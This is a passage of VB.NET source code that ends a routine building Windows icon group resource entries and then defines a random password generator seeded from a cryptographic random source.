                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region
#Region "RANDOM"
Public Class Randomization
    Public Class RandomPassword
        Private Shared DEFAULT_MIN_PASSWORD_LENGTH As Integer = 8
        Private Shared DEFAULT_MAX_PASSWORD_LENGTH As Integer = 10
        Private Shared PASSWORD_CHARS_LCASE As String = "abcdefgijkmnopqrstwxyz"
        Private Shared PASSWORD_CHARS_UCASE As String = "ABCDEFGHJKLMNPQRSTWXYZ"
        Public Shared Function Generate() As String
            Generate = Generate(DEFAULT_MIN_PASSWORD_LENGTH, _
                                DEFAULT_MAX_PASSWORD_LENGTH)
        End Function
        Public Shared Function Generate(ByVal length As Integer) As String
            Generate = Generate(length, length)
        End Function
        Public Shared Function Generate(ByVal minLength As Integer, _
                                ByVal maxLength As Integer) _
          As String
            If (minLength <= 0 Or maxLength <= 0 Or minLength > maxLength) Then
                Generate = Nothing
            End If
            Dim charGroups As Char()() = New Char()() _
            { _
                PASSWORD_CHARS_LCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray()}
            Dim charsLeftInGroup As Integer() = New Integer(charGroups.Length - 1) {}
            Dim I As Integer
            For I = 0 To charsLeftInGroup.Length - 1
                charsLeftInGroup(I) = charGroups(I).Length
            Next
            Dim leftGroupsOrder As Integer() = New Integer(charGroups.Length - 1) {}
            For I = 0 To leftGroupsOrder.Length - 1
                leftGroupsOrder(I) = I
            Next
            Dim randomBytes As Byte() = New Byte(3) {}
            Dim rng As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            rng.GetBytes(randomBytes)
            Dim seed As Integer = ((randomBytes(0) And &H7F) << 24 Or _
                                    randomBytes(1) << 16 Or _
                                    randomBytes(2) << 8 Or _
                                    randomBytes(3))
            Dim random As Random = New Random(seed)
            Dim password As Char() = Nothing
            If (minLength < maxLength) Then
                password = New Char(random.Next(minLength - 1, maxLength)) {}
            Else
                password = New Char(minLength - 1) {}
            End If
            Dim nextCharIdx As Integer
            Dim nextGroupIdx As Integer
            Dim nextLeftGroupsOrderIdx As Integer
            Dim lastCharIdx As Integer
            Dim lastLeftGroupsOrderIdx As Integer = leftGroupsOrder.Length - 1
            For I = 0 To password.Length - 1
                If (lastLeftGroupsOrderIdx = 0) Then
                    nextLeftGroupsOrderIdx = 0
                Else
                    nextLeftGroupsOrderIdx = random.Next(0, lastLeftGroupsOrderIdx)
                End If
                nextGroupIdx = leftGroupsOrder(nextLeftGroupsOrderIdx)
                lastCharIdx = charsLeftInGroup(nextGroupIdx) - 1
                If (lastCharIdx = 0) Then
                    nextCharIdx = 0
                Else
                    nextCharIdx = random.Next(0, lastCharIdx + 1)
                End If
                password(I) = charGroups(nextGroupIdx)(nextCharIdx)
                If (lastCharIdx = 0) Then
                    charsLeftInGroup(nextGroupIdx) = _
                                    charGroups(nextGroupIdx).Length
                Else
                    If (lastCharIdx <> nextCharIdx) Then
                        Dim temp As Char = charGroups(nextGroupIdx)(lastCharIdx)
                        charGroups(nextGroupIdx)(lastCharIdx) = _
                                    charGroups(nextGroupIdx)(nextCharIdx)
                        charGroups(nextGroupIdx)(nextCharIdx) = temp
                    End If

                    charsLeftInGroup(nextGroupIdx) = _
                               charsLeftInGroup(nextGroupIdx) - 1
                End If
                If (lastLeftGroupsOrderIdx = 0) Then
                    lastLeftGroupsOrderIdx = leftGroupsOrder.Length - 1
                Else
                    If (lastLeftGroupsOrderIdx <> nextLeftGroupsOrderIdx) Then
                        Dim temp As Integer = _
                                    leftGroupsOrder(lastLeftGroupsOrderIdx)
                        leftGroupsOrder(lastLeftGroupsOrderIdx) = _
                                    leftGroupsOrder(nextLeftGroupsOrderIdx)
                        leftGroupsOrder(nextLeftGroupsOrderIdx) = temp
                    End If
                    lastLeftGroupsOrderIdx = lastLeftGroupsOrderIdx - 1
                End If
            Next
            Generate = New String(password)
        End Function
    End Class
End Class
#End Region